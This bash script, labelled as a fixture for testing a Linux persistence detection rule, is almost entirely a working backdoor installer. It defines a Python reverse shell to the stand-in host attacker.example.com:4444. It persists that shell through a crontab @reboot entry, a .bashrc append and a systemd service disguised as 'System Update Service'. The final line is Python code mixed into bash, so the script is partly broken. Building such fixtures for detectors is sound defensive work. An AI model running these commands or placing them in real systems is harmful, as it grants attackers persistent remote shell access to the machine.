#!/bin/bash
# Fixture: Linux persistence – must trigger Linux_Persistence rule.
BACKDOOR='python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.example.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"'

# Add crontab entry
(crontab -l 2>/dev/null; echo "@reboot $BACKDOOR") | crontab -

# Also add to .bashrc
echo "$BACKDOOR" >> ~/.bashrc

# Write systemd service
cat > /etc/systemd/system/update-service.service <<EOF
[Unit]
Description=System Update Service

[Service]
ExecStart=/bin/bash -c "$BACKDOOR"
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable update-service
os.system("reboot now")
